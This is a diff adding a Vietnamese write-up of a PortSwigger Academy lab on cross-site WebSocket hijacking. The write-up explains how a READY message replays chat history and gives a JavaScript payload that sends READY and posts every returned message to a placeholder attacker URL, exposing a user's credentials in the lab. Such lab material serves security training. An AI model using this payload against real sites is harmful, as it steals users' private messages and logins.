@@ -77,3 +77,38 @@ To solve the lab, use the exploit server to host an HTML/JavaScript payload that
 NOTE:
 To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.
 ```
+
+Giao diện web tương tự Lab #1
+
+* Exploit:
+
+Verify lại luồng hoạt động của ứng dụng. Ta thấy sau khi đã gửi vài messeage chat cùng server mà thực hiện reload lại Page thì Ứng dụng sẽ load lại toàn bộ các tin nhắn cũ. Lab lại cụ thể như sau: 
+
+- Truy cập vào link **/chat** và gửi 1 vài tin nhắn bất kỳ:
+
+<img width="607" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b1320d61-fc37-4276-a76d-26e1b17918a2">
+
+- Reload lại web page, theo dõi thấy tin nhắn gửi trước đây được load lại như cũ:
+
+<img width="599" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/13e8c988-3c0a-42f7-883a-f448365f2dba">
+
+- Theo dõi quá trình reload trên BurpSuite (Websockets history), ta thấy là sau khi Client gửi đến Server message **READY** thì Server sẽ gửi lại phía Client toàn bộ các message của phiên trước đó.
+
+<img width="497" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/0e52e466-dd62-468d-ac05-703924230387">
+
+Okay vậy là nếu ta muốn đọc được các tin nhắn cũ của Victim thì phải khiến cho Victim gửi message **READY** đến link WebSockets của bài lab.
+Portswigger đã cung cấp cho chúng ta server exploit để gửi payload đến cho victim, mặc định hiểu là victim sẽ click vào link và load nội dung trên exploit server. => Ta chuẩn bị payload trong link exploit như sau:
+```javascript
+<script>
+    var ws = new WebSocket('wss://<link-to-lab-challenge>');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('<link-to-site-hook-attacker>', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+Sau khi deploy nội dung đến cho victim, đợi 1 khoảng thời gian sẽ thu được 1 loạt HTTP Request có Body chứa các Message cũ của Victim chat với Server. Trong đó có một nội dung chat chứa username/password của user carlos:
+
+<img width="449" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/8bd1e2e8-7f4f-43b9-bf2b-b91c1dba6e17">
